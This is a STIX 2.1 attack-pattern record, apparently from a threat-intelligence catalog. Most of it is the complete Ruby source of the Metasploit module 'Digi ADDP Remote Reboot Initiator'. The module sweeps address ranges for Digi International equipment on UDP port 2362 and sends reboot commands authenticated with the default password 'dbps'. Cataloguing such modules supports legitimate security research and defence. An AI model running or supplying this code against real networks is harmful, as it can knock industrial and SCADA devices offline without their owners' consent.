{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--172a3e87-7653-47de-95fb-1d4a37778cf3",
    "created": "2024-08-14T16:26:52.939236Z",
    "modified": "2024-08-14T16:26:52.93924Z",
    "name": "Digi ADDP Remote Reboot Initiator",
    "description": "Reboot Digi International based equipment through the ADDP service",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/scada/digi_addp_reboot.rb",
            "external_id": "digi_addp_reboot.rb"
        },
        {
            "source_name": "reference",
            "url": "http://qbeukes.blogspot.com/2009/11/advanced-digi-discovery-protocol_21.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.digi.com/resources/documentation/digidocs/90001537/#References/r_Advanced_Device_Discovery_Prot.htm?Highlight=advanced%20device%20discovery%20protocol"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::UDPScanner\n\n  def initialize\n    super(\n      'Name'        => 'Digi ADDP Remote Reboot Initiator',\n      'Description' => 'Reboot Digi International based equipment through the ADDP service',\n      'Author'      => 'hdm',\n      'References'  =>\n        [\n          ['URL', 'http://qbeukes.blogspot.com/2009/11/advanced-digi-discovery-protocol_21.html'],\n          ['URL', 'https://www.digi.com/resources/documentation/digidocs/90001537/#References/r_Advanced_Device_Discovery_Prot.htm?Highlight=advanced%20device%20discovery%20protocol'],\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      Opt::RPORT(2362),\n      OptString.new('ADDP_PASSWORD', [true, 'The ADDP protocol password for each target', 'dbps'])\n    ])\n  end\n\n  def scanner_prescan(batch)\n    print_status(\"Finding ADDP nodes within #{batch[0]}->#{batch[-1]} (#{batch.length} hosts)\")\n    @results = {}\n  end\n\n  def scan_host(ip)\n    Rex::Proto::ADDP.request_config_all.each do |pkt|\n      scanner_send(pkt, ip, datastore['RPORT'])\n    end\n  end\n\n  def scanner_postscan(batch)\n    queue = {}\n    @results.each_pair do |ip,res|\n      queue[ip] = res\n    end\n\n    @results = {}\n\n    queue.each_pair do |ip, res|\n      info = Rex::Proto::ADDP.reply_to_string(res)\n      print_status(\"#{ip}:#{datastore['RPORT']} Sending reboot request to device with MAC #{res[:mac]}...\")\n      pkt = Rex::Proto::ADDP.request_reboot(res[:magic], res[:mac], datastore['ADDP_PASSWORD'])\n      scanner_send(pkt, ip, datastore['RPORT'])\n    end\n\n    # Wait for the final replies to trickle in\n    scanner_recv(10) if queue.length > 0\n  end\n\n  def scanner_process(data, shost, sport)\n    @results[shost] ||= {}\n    @results[shost] = Rex::Proto::ADDP.decode_reply(data)\n\n    if @results[shost][:cmd] == Rex::Proto::ADDP::CMD_REBOOT_REP\n      print_status(\"#{shost}:#{sport} Reboot Status: \" + Rex::Proto::ADDP.reply_to_string(@results[shost]))\n    end\n  end\nend\n"
}